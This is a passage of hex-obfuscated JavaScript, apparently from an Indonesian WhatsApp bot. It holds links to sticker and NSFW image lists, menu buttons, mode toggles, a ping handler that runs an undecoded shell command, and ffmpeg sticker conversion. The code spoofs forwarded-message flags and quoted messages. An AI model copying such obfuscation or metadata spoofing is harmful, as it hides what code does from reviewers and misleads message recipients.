74\x2E\x63\x6F\x6D\x2F\x7A\x65\x65\x6F\x6E\x65\x6F\x66\x63\x2F\x55\x6C\x74\x72\x6F\x69\x64\x2F\x6D\x61\x69\x6E\x2F\x73\x74\x72\x69\x6E\x67\x73\x2F\x6E\x73\x66\x77\x2F\x74\x65\x6E\x74\x61\x63\x6C\x65\x73\x2E\x74\x78\x74","\x74\x68\x69\x67\x68\x73","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x7A\x65\x65\x6F\x6E\x65\x6F\x66\x63\x2F\x55\x6C\x74\x72\x6F\x69\x64\x2F\x6D\x61\x69\x6E\x2F\x73\x74\x72\x69\x6E\x67\x73\x2F\x6E\x73\x66\x77\x2F\x74\x68\x69\x67\x68\x73\x2E\x74\x78\x74","\x79\x75\x72\x69","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x7A\x65\x65\x6F\x6E\x65\x6F\x66\x63\x2F\x55\x6C\x74\x72\x6F\x69\x64\x2F\x6D\x61\x69\x6E\x2F\x73\x74\x72\x69\x6E\x67\x73\x2F\x6E\x73\x66\x77\x2F\x79\x75\x72\x69\x2E\x74\x78\x74","\x7A\x65\x74\x74\x61\x69","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x7A\x65\x65\x6F\x6E\x65\x6F\x66\x63\x2F\x55\x6C\x74\x72\x6F\x69\x64\x2F\x6D\x61\x69\x6E\x2F\x73\x74\x72\x69\x6E\x67\x73\x2F\x6E\x73\x66\x77\x2F\x7A\x65\x74\x74\x61\x69\x52\x79\x6F\x75\x69\x6B\x69\x2E\x74\x78\x74","\x61\x77\x6F\x61\x77\x6F","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x7A\x65\x65\x6F\x6E\x65\x6F\x66\x63\x2F\x55\x6C\x74\x72\x6F\x69\x64\x2F\x6D\x61\x69\x6E\x2F\x73\x74\x72\x69\x6E\x67\x73\x2F\x54\x65\x6C\x65\x53\x74\x63\x2F\x41\x77\x6F\x61\x77\x6F\x2E\x74\x78\x74","\x62\x65\x6E\x65\x64\x69\x63\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x7A\x65\x65\x6F\x6E\x65\x6F\x66\x63\x2F\x55\x6C\x74\x72\x6F\x69\x64\x2F\x6D\x61\x69\x6E\x2F\x73\x74\x72\x69\x6E\x67\x73\x2F\x54\x65\x6C\x65\x53\x74\x63\x2F\x42\x65\x6E\x65\x64\x69\x63\x74\x2E\x74\x78\x74","\x63\x68\x61\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x7A\x65\x65\x6F\x6E\x65\x6F\x66\x63\x2F\x55\x6C\x74\x72\x6F\x69\x64\x2F\x6D\x61\x69\x6E\x2F\x73\x74\x72\x69\x6E\x67\x73\x2F\x54\x65\x6C\x65\x53\x74\x63\x2F\x43\x68\x61\x74\x2E\x74\x78\x74","\x64\x62\x66\x6C\x79","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x7A\x65\x65\x6F\x6E\x65\x6F\x66\x63\x2F\x55\x6C\x74\x72\x6F\x69\x64\x2F\x6D\x61\x69\x6E\x2F\x73\x74\x72\x69\x6E\x67\x73\x2F\x54\x65\x6C\x65\x53\x74\x63\x2F\x44\x42\x66\x6C\x79\x2E\x74\x78\x74","\x64\x69\x6E\x6F\x5F\x6B\x75\x6E\x69\x6E\x67","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x7A\x65\x65\x6F\x6E\x65\x6F\x66\x63\x2F\x55\x6C\x74\x72\x6F\x69\x64\x2F\x6D\x61\x69\x6E\x2F\x73\x74\x72\x69\x6E\x67\x73\x2F\x54\x65\x6C\x65\x53\x74\x63\x2F\x44\x69\x6E\x6F\x5F\x6B\x75\x6E\x69\x6E\x67\x2E\x74\x78\x74","\x64\x6F\x67\x65","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x7A\x65\x65\x6F\x6E\x65\x6F\x66\x63\x2F\x55\x6C\x74\x72\x6F\x69\x64\x2F\x6D\x61\x69\x6E\x2F\x73\x74\x72\x69\x6E\x67\x73\x2F\x54\x65\x6C\x65\x53\x74\x63\x2F\x44\x6F\x67\x65\x2E\x74\x78\x74","\x67\x6F\x6A\x6F\x73\x61\x74\x6F\x72\x75","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x7A\x65\x65\x6F\x6E\x65\x6F\x66\x63\x2F\x55\x6C\x74\x72\x6F\x69\x64\x2F\x6D\x61\x69\x6E\x2F\x73\x74\x72\x69\x6E\x67\x73\x2F\x54\x65\x6C\x65\x53\x74\x63\x2F\x47\x6F\x6A\x6F\x73\x61\x74\x75\x72\x75\x2E\x74\x78\x74","\x68\x6F\x70\x65\x5F\x62\x6F\x79","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x7A\x65\x65\x6F\x6E\x65\x6F\x66\x63\x2F\x55\x6C\x74\x72\x6F\x69\x64\x2F\x6D\x61\x69\x6E\x2F\x73\x74\x72\x69\x6E\x67\x73\x2F\x54\x65\x6C\x65\x53\x74\x63\x2F\x48\x6F\x70\x65\x42\x6F\x79\x2E\x74\x78\x74","\x6A\x69\x73\x6F\x6F","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x7A\x65\x65\x6F\x6E\x65\x6F\x66\x63\x2F\x55\x6C\x74\x72\x6F\x69\x64\x2F\x6D\x61\x69\x6E\x2F\x73\x74\x72\x69\x6E\x67\x73\x2F\x54\x65\x6C\x65\x53\x74\x63\x2F\x4A\x69\x69\x73\x6F\x2E\x74\x78\x74","\x6B\x72\x5F\x72\x6F\x62\x6F\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x7A\x65\x65\x6F\x6E\x65\x6F\x66\x63\x2F\x55\x6C\x74\x72\x6F\x69\x64\x2F\x6D\x61\x69\x6E\x2F\x73\x74\x72\x69\x6E\x67\x73\x2F\x54\x65\x6C\x65\x53\x74\x63\x2F\x4B\x72\x5F\x72\x6F\x62\x6F\x74\x2E\x74\x78\x74","\x6B\x75\x63\x69\x6E\x67","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x7A\x65\x65\x6F\x6E\x65\x6F\x66\x63\x2F\x55\x6C\x74\x72\x6F\x69\x64\x2F\x6D\x61\x69\x6E\x2F\x73\x74\x72\x69\x6E\x67\x73\x2F\x54\x65\x6C\x65\x53\x74\x63\x2F\x4B\x75\x63\x69\x6E\x67\x42\x79\x5A\x65\x65\x6F\x6E\x65\x2E\x74\x78\x74","\x6C\x6F\x6E\x74\x65","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x7A\x65\x65\x6F\x6E\x65\x6F\x66\x63\x2F\x55\x6C\x74\x72\x6F\x69\x64\x2F\x6D\x61\x69\x6E\x2F\x73\x74\x72\x69\x6E\x67\x73\x2F\x54\x65\x6C\x65\x53\x74\x63\x2F\x4C\x6F\x6E\x74\x65\x2E\x74\x78\x74","\x6D\x61\x6E\x75\x73\x69\x61\x5F\x6C\x69\x64\x69","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x7A\x65\x65\x6F\x6E\x65\x6F\x66\x63\x2F\x55\x6C\x74\x72\x6F\x69\x64\x2F\x6D\x61\x69\x6E\x2F\x73\x74\x72\x69\x6E\x67\x73\x2F\x54\x65\x6C\x65\x53\x74\x63\x2F\x4D\x61\x6E\x75\x73\x69\x61\x4C\x69\x64\x69\x2E\x74\x78\x74","\x6D\x65\x6E\x6A\x61\x6D\x65\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x7A\x65\x65\x6F\x6E\x65\x6F\x66\x63\x2F\x55\x6C\x74\x72\x6F\x69\x64\x2F\x6D\x61\x69\x6E\x2F\x73\x74\x72\x69\x6E\x67\x73\x2F\x54\x65\x6C\x65\x53\x74\x63\x2F\x4D\x65\x6E\x6A\x61\x6D\x65\x74\x2E\x74\x78\x74","\x6D\x65\x6F\x77","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x7A\x65\x65\x6F\x6E\x65\x6F\x66\x63\x2F\x55\x6C\x74\x72\x6F\x69\x64\x2F\x6D\x61\x69\x6E\x2F\x73\x74\x72\x69\x6E\x67\x73\x2F\x54\x65\x6C\x65\x53\x74\x63\x2F\x4D\x65\x6F\x77\x2E\x74\x78\x74","\x6E\x69\x63\x68\x6F\x6C\x61\x73","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x7A\x65\x65\x6F\x6E\x65\x6F\x66\x63\x2F\x55\x6C\x74\x72\x6F\x69\x64\x2F\x6D\x61\x69\x6E\x2F\x73\x74\x72\x69\x6E\x67\x73\x2F\x54\x65\x6C\x65\x53\x74\x63\x2F\x4E\x69\x63\x68\x6F\x6C\x61\x73\x2E\x74\x78\x74","\x70\x61\x74\x72\x69\x63\x6B","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x7A\x65\x65\x6F\x6E\x65\x6F\x66\x63\x2F\x55\x6C\x74\x72\x6F\x69\x64\x2F\x6D\x61\x69\x6E\x2F\x73\x74\x72\x69\x6E\x67\x73\x2F\x54\x65\x6C\x65\x53\x74\x63\x2F\x50\x61\x74\x72\x69\x63\x6B\x42\x79\x5A\x65\x65\x6F\x6E\x65\x2E\x74\x78\x74","\x70\x6F\x70\x6F\x63\x69","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x7A\x65\x65\x6F\x6E\x65\x6F\x66\x63\x2F\x55\x6C\x74\x72\x6F\x69\x64\x2F\x6D\x61\x69\x6E\x2F\x73\x74\x72\x69\x6E\x67\x73\x2F\x54\x65\x6C\x65\x53\x74\x63\x2F\x50\x6F\x70\x6F\x63\x69\x2E\x74\x78\x74","\x73\x70\x6F\x6E\x73\x62\x6F\x62","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x7A\x65\x65\x6F\x6E\x65\x6F\x66\x63\x2F\x55\x6C\x74\x72\x6F\x69\x64\x2F\x6D\x61\x69\x6E\x2F\x73\x74\x72\x69\x6E\x67\x73\x2F\x54\x65\x6C\x65\x53\x74\x63\x2F\x53\x70\x6F\x6E\x73\x62\x6F\x62\x5F\x6F\x6E\x6C\x79\x2E\x74\x78\x74","\x6B\x61\x77\x61\x6E\x5F\x73\x70\x6F\x6E\x73\x62\x6F\x62","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x7A\x65\x65\x6F\x6E\x65\x6F\x66\x63\x2F\x55\x6C\x74\x72\x6F\x69\x64\x2F\x6D\x61\x69\x6E\x2F\x73\x74\x72\x69\x6E\x67\x73\x2F\x54\x65\x6C\x65\x53\x74\x63\x2F\x53\x70\x6F\x6E\x73\x62\x6F\x62\x5F\x66\x72\x69\x65\x6E\x64\x73\x2E\x74\x78\x74","\x74\x79\x6E\x69","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x7A\x65\x65\x6F\x6E\x65\x6F\x66\x63\x2F\x55\x6C\x74\x72\x6F\x69\x64\x2F\x6D\x61\x69\x6E\x2F\x73\x74\x72\x69\x6E\x67\x73\x2F\x54\x65\x6C\x65\x53\x74\x63\x2F\x54\x79\x6E\x69\x2E\x74\x78\x74","\x62\x75\x74\x74\x6F\x6E\x73\x52\x65\x73\x70\x6F\x6E\x73\x65\x4D\x65\x73\x73\x61\x67\x65","\x73\x65\x6C\x65\x63\x74\x65\x64\x42\x75\x74\x74\x6F\x6E\x49\x64","\x4C\x69\x73\x74\x20\x6D\x65\x6E\x75\x20\x62\x6F\x74\x20\x61\x64\x61\x20\x64\x69\x73\x69\x6E\x69\x20\x6B\x61\x6B\x20\x73\x69\x6C\x61\x68\x6B\x61\x6E\x20\x64\x69\x20\x70\x69\x6C\x69\x68","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u25A2\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u25B7","\x53\x49\x4E\x47\x4C\x45\x5F\x53\x45\x4C\x45\x43\x54","\u25C9\x20\x41\x6C\x6C\x20\x6D\x65\x6E\x75\x20\x62\x6F\x74","\x0A\x0A\x5F\x63\x68\x6F\x6F\x73\x65\x20\x74\x68\x69\x73\x20\x69\x66\x20\x79\x6F\x75\x20\x77\x61\x6E\x74\x20\x74\x6F\x20\x75\x73\x65\x20\x74\x68\x65\x20\x61\x6C\x6C\x6D\x65\x6E\x75\x20\x63\x6F\x6D\x6D\x61\x6E\x64\x5F","\u25C9\x20\x4D\x65\x6E\x75\x20\x6B\x65\x2D\x31","\x0A\x0A\x5F\x63\x68\x6F\x6F\x73\x65\x20\x74\x68\x69\x73\x20\x69\x66\x20\x79\x6F\x75\x20\x77\x61\x6E\x74\x20\x74\x6F\x20\x75\x73\x65\x20\x74\x68\x65\x20\x64\x6F\x77\x6E\x6C\x6F\x61\x64\x6D\x65\x6E\x75\x20\x63\x6F\x6D\x6D\x61\x6E\x64\x5F","\x30","\u25C9\x20\x4D\x65\x6E\x75\x20\x6B\x65\x2D\x32","\x0A\x0A\x5F\x63\x68\x6F\x6F\x73\x65\x20\x74\x68\x69\x73\x20\x69\x66\x20\x79\x6F\x75\x20\x77\x61\x6E\x74\x20\x74\x6F\x20\x75\x73\x65\x20\x74\x68\x65\x20\x63\x6F\x6E\x76\x65\x72\x74\x6D\x65\x6E\x75\x20\x63\x6F\x6D\x6D\x61\x6E\x64\x5F","\u25C9\x20\x4D\x65\x6E\x75\x20\x6B\x65\x2D\x33","\x0A\x0A\x5F\x63\x68\x6F\x6F\x73\x65\x20\x74\x68\x69\x73\x20\x69\x66\x20\x79\x6F\x75\x20\x77\x61\x6E\x74\x20\x74\x6F\x20\x75\x73\x65\x20\x74\x68\x65\x20\x66\x75\x6E\x6D\x65\x6E\x75\x20\x63\x6F\x6D\x6D\x61\x6E\x64\x5F","\u25C9\x20\x4D\x65\x6E\x75\x20\x6B\x65\x2D\x34","\x0A\x0A\x5F\x63\x68\x6F\x6F\x73\x65\x20\x74\x68\x69\x73\x20\x69\x66\x20\x79\x6F\x75\x20\x77\x61\x6E\x74\x20\x74\x6F\x20\x75\x73\x65\x20\x74\x68\x65\x20\x6D\x61\x6B\x65\x72\x6D\x65\x6E\x75\x20\x63\x6F\x6D\x6D\x61\x6E\x64\x5F","\u25C9\x20\x4D\x65\x6E\x75\x20\x6B\x65\x2D\x35","\x0A\x0A\x5F\x63\x68\x6F\x6F\x73\x65\x20\x74\x68\x69\x73\x20\x69\x66\x20\x79\x6F\x75\x20\x77\x61\x6E\x74\x20\x74\x6F\x20\x75\x73\x65\x20\x74\x68\x65\x20\x6F\x74\x68\x65\x72\x6D\x65\x6E\x75\x20\x63\x6F\x6D\x6D\x61\x6E\x64\x5F","\u25C9\x20\x4D\x65\x6E\x75\x20\x6B\x65\x2D\x36","\x0A\x0A\x5F\x63\x68\x6F\x6F\x73\x65\x20\x74\x68\x69\x73\x20\x69\x66\x20\x79\x6F\x75\x20\x77\x61\x6E\x74\x20\x74\x6F\x20\x75\x73\x65\x20\x74\x68\x65\x20\x6F\x77\x6E\x65\x72\x6D\x65\x6E\x75\x20\x63\x6F\x6D\x6D\x61\x6E\x64\x5F","\u25C9\x20\x4D\x65\x6E\x75\x20\x6B\x65\x2D\x37","\x0A\x0A\x5F\x63\x68\x6F\x6F\x73\x65\x20\x74\x68\x69\x73\x20\x69\x66\x20\x79\x6F\x75\x20\x77\x61\x6E\x74\x20\x74\x6F\x20\x75\x73\x65\x20\x74\x68\x65\x20\x73\x74\x6F\x72\x61\x67\x65\x6D\x65\x6E\x75\x20\x63\x6F\x6D\x6D\x61\x6E\x64\x5F","\u25C9\x20\x4D\x65\x6E\x75\x20\x6B\x65\x2D\x38","\x0A\x0A\x5F\x63\x68\x6F\x6F\x73\x65\x20\x74\x68\x69\x73\x20\x69\x66\x20\x79\x6F\x75\x20\x77\x61\x6E\x74\x20\x74\x6F\x20\x75\x73\x65\x20\x74\x68\x65\x20\x74\x61\x67\x6D\x65\x6E\x75\x20\x63\x6F\x6D\x6D\x61\x6E\x64\x5F","\u25C9\x20\x4D\x65\x6E\x75\x20\x6B\x65\x2D\x39","\x0A\x0A\x5F\x63\x68\x6F\x6F\x73\x65\x20\x74\x68\x69\x73\x20\x69\x66\x20\x79\x6F\x75\x20\x77\x61\x6E\x74\x20\x74\x6F\x20\x75\x73\x65\x20\x74\x68\x65\x20\x75\x70\x6D\x65\x6E\x75\x20\x63\x6F\x6D\x6D\x61\x6E\x64\x5F","\u25C9\x20\x4D\x65\x6E\x75\x20\x6B\x65\x2D\x31\x30","\x0A\x0A\x5F\x63\x68\x6F\x6F\x73\x65\x20\x74\x68\x69\x73\x20\x69\x66\x20\x79\x6F\x75\x20\x77\x61\x6E\x74\x20\x74\x6F\x20\x75\x73\x65\x20\x74\x68\x65\x20\x73\x65\x74\x20\x73\x74\x63\x20\x63\x6D\x64\x20\x63\x6F\x6D\x6D\x61\x6E\x64\x5F","\u25C9\x20\x4D\x65\x6E\x75\x20\x6B\x65\x2D\x31\x31","\x0A\x0A\x5F\x63\x68\x6F\x6F\x73\x65\x20\x74\x68\x69\x73\x20\x69\x66\x20\x79\x6F\x75\x20\x77\x61\x6E\x74\x20\x74\x6F\x20\x75\x73\x65\x20\x74\x68\x65\x20\x67\x61\x63\x68\x61\x63\x65\x63\x61\x6E\x20\x63\x6F\x6D\x6D\x61\x6E\x64\x5F","\u25C9\x20\x4D\x65\x6E\x75\x20\x6B\x65\x2D\x31\x32","\x0A\x0A\x5F\x63\x68\x6F\x6F\x73\x65\x20\x74\x68\x69\x73\x20\x69\x66\x20\x79\x6F\x75\x20\x77\x61\x6E\x74\x20\x74\x6F\x20\x75\x73\x65\x20\x74\x68\x65\x20\x74\x65\x6C\x65\x73\x74\x63\x20\x63\x6F\x6D\x6D\x61\x6E\x64\x5F","\u25C9\x20\x4D\x65\x6E\x75\x20\x6B\x65\x2D\x31\x33","\x0A\x0A\x5F\x63\x68\x6F\x6F\x73\x65\x20\x74\x68\x69\x73\x20\x69\x66\x20\x79\x6F\x75\x20\x77\x61\x6E\x74\x20\x74\x6F\x20\x75\x73\x65\x20\x74\x68\x65\x20\x6E\x73\x66\x77\x6D\x65\x6E\x75\x20\x63\x6F\x6D\x6D\x61\x6E\x64\x5F","\u25C9\x20\x53\x6F\x75\x72\x63\x65\x20\x73\x63\x72\x69\x70\x74\x20\x62\x6F\x74","\x0A\x0A\x5F\x63\x68\x6F\x6F\x73\x65\x20\x74\x68\x69\x73\x20\x69\x66\x20\x79\x6F\x75\x20\x77\x61\x6E\x74\x20\x74\x6F\x20\x6B\x6E\x6F\x77\x20\x73\x6F\x75\x72\x63\x65\x20\x63\x6F\x64\x65\x20\x74\x68\x69\x73\x20\x62\x6F\x74\x5F","\u25C9\x20\x43\x6F\x6E\x74\x72\x69\x62\x75\x74\x69\x6F\x6E","\x0A\x0A\x5F\x63\x68\x6F\x6F\x73\x65\x20\x74\x68\x69\x73\x20\x69\x66\x20\x79\x6F\x75\x20\x77\x61\x6E\x74\x20\x74\x6F\x20\x6B\x6E\x6F\x77\x20\x61\x6E\x79\x6F\x6E\x65\x20\x77\x68\x6F\x20\x63\x6F\x6E\x74\x72\x69\x62\x75\x74\x65\x64\x20\x74\x6F\x20\x74\x68\x69\x73\x20\x73\x63\x72\x69\x70\x74\x5F","\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x49\x6E\x69\x20\x6B\x61\x6B\x20\x6B\x6F\x6E\x74\x61\x6B\x20\x6F\x77\x6E\x65\x72\x20\x6B\x75\x20\x40","\x2A\x53\x54\x41\x54\x55\x53\x2A","\x3E\x20\x4F\x46\x46\x4C\x49\x4E\x45","\x3E\x20\x4F\x4E\x4C\x49\x4E\x45","\x3E\x20\x53\x45\x4C\x46\x2D\x4D\x4F\x44\x45","\x3E\x20\x50\x55\x42\x4C\x49\x43\x2D\x4D\x4F\x44\x45"];const stc=mek[_0x2363[1]][_0x2363[0]];const msc=mek[_0x2363[1]][_0x2363[2]];wew= fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`);alfa2= _0x2363[6];alfa3= _0x2363[7];if(msc){if(msc[_0x2363[8]]== 57212){alpha[_0x2363[10]](from,wew,image,{thumbnail:fs[_0x2363[5]](`${_0x2363[3]}${tee}${_0x2363[9]}`),quoted:ftroli,caption:help(prefix,hahh,pushname,ownername,status),contextInfo:{"\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x4A\x69\x64":[alfa],"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true},sendEphemeral:true})}};if(stc){if(stc[_0x2363[8]]== `${_0x2363[4]}${cmd_stc_ping}${_0x2363[4]}`){const timestamp=speed();const latensi=speed()- timestamp;exec(`${_0x2363[11]}`,(_0xa9f7x5,_0xa9f7x6,_0xa9f7x7)=>{const _0xa9f7x8=_0xa9f7x6.toString(_0x2363[12]);const _0xa9f7x9=_0xa9f7x8[_0x2363[14]](/Memory:/,_0x2363[13]);const _0xa9f7xa=`${_0x2363[15]}${_0xa9f7x9}${_0x2363[16]}${latensi[_0x2363[17]](4)}${_0x2363[18]}`;fakegroup(_0xa9f7xa)})}};if(stc){if(stc[_0x2363[8]]== `${_0x2363[4]}${cmd_stc_menu}${_0x2363[4]}`){let contentt=fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`);const mediaa= await alpha[_0x2363[20]](from,contentt,MessageType[_0x2363[19]],{thumbnail:fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`)});const buttons=[{buttonId:_0x2363[21],buttonText:{displayText:_0x2363[22]},type:1},{buttonId:_0x2363[23],buttonText:{displayText:_0x2363[24]},type:1},{buttonId:_0x2363[25],buttonText:{displayText:_0x2363[26]},type:1}];const btn={contentText:`${_0x2363[27]}${pushname}${_0x2363[28]}`,footerText:`${_0x2363[4]}${creator}${_0x2363[4]}`,buttons:buttons,headerType:4,imageMessage:mediaa[_0x2363[1]][_0x2363[29]]};alpha[_0x2363[10]](from,btn,MessageType[_0x2363[30]],{thumbnail:fs[_0x2363[5]](`${_0x2363[3]}${thumbnail}${_0x2363[4]}`),caption:_0x2363[31],"\x63\x6F\x6E\x74\x65\x78\x74\x49\x6E\x66\x6F":{text:_0x2363[32],"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":1000000000,isForwarded:true,sendEphemeral:true,"\x65\x78\x74\x65\x72\x6E\x61\x6C\x41\x64\x52\x65\x70\x6C\x79":{"\x74\x69\x74\x6C\x65":`${_0x2363[4]}${hahh}${_0x2363[33]}${pushname}${_0x2363[4]}`,"\x62\x6F\x64\x79":`${_0x2363[4]}${baper}${_0x2363[4]}`,"\x70\x72\x65\x76\x69\x65\x77\x54\x79\x70\x65":_0x2363[34],"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C\x55\x72\x6C":`${_0x2363[4]}${img}${_0x2363[4]}`,"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C":_0x2363[4],"\x73\x6F\x75\x72\x63\x65\x55\x72\x6C":`${_0x2363[4]}${apiku}${_0x2363[4]}`}},quoted:ftoko,sendEphemeral:true})}};if(stc){if(stc[_0x2363[8]]== `${_0x2363[4]}${cmd_stc_self}${_0x2363[4]}`){if(!mek[_0x2363[36]][_0x2363[35]]){return fakestatus(_0x2363[37])};if(banChats=== true){return};uptime= process[_0x2363[38]]();banChats= true;fakeitem(`${_0x2363[39]}`)}};if(stc){if(stc[_0x2363[8]]== `${_0x2363[4]}${cmd_stc_public}${_0x2363[4]}`){if(!mek[_0x2363[36]][_0x2363[35]]){return fakestatus(_0x2363[37])};if(banChats=== false){return};banChats= false;fakeitem(`${_0x2363[40]}`)}};if(stc){if(stc[_0x2363[8]]== `${_0x2363[4]}${cmd_stc_image_to_sticker}${_0x2363[4]}`){const isPoto=(type=== _0x2363[29]|| type=== _0x2363[41]);const isVideo=type=== _0x2363[0]&& content[_0x2363[42]](_0x2363[41]);const isFoto=type=== _0x2363[0]&& content[_0x2363[42]](_0x2363[29]);if((isPoto&&  !mek[_0x2363[1]][_0x2363[41]]|| isFoto)&& args[_0x2363[43]]== 0){const encmedia=isFoto?JSON[_0x2363[48]](JSON[_0x2363[47]](mek)[_0x2363[14]](_0x2363[45],_0x2363[46]))[_0x2363[1]][_0x2363[0]][_0x2363[44]]:mek;const media= await alpha[_0x2363[49]](encmedia);ran= _0x2363[50]; await ffmpeg(`${_0x2363[69]}${media}${_0x2363[4]}`)[_0x2363[68]](media)[_0x2363[63]](_0x2363[66],function(_0xa9f7x15){console[_0x2363[61]](`${_0x2363[67]}${_0xa9f7x15}${_0x2363[4]}`)})[_0x2363[63]](_0x2363[64],function(_0xa9f7x14){console[_0x2363[61]](`${_0x2363[65]}${_0xa9f7x14}${_0x2363[4]}`);fs[_0x2363[62]](media);reply(_0x2363[64])})[_0x2363[63]](_0x2363[59],function(){console[_0x2363[61]](_0x2363[60]);alpha[_0x2363[10]](from,fs[_0x2363[5]](ran),sticker,{quoted:mek});fs[_0x2363[62]](media);fs[_0x2363[62]](ran)})[_0x2363[58]]([`${_0x2363[54]}`,`${_0x2363[55]}`,`${_0x2363[56]}`,`${_0x2363[57]}`])[_0x2363[53]](_0x2363[52])[_0x2363[51]](ran)}else {if((isPoto&& mek[_0x2363[1]][_0x2363[41]][_0x2363[70]]< 11|| isVideo&& mek[_0x2363[1]][_0x2363[0]][_0x2363[44]][_0x2363[71]][_0x2363[41]][_0x2363[70]]< 11)&& args[_0x2363[43]]== 0){const 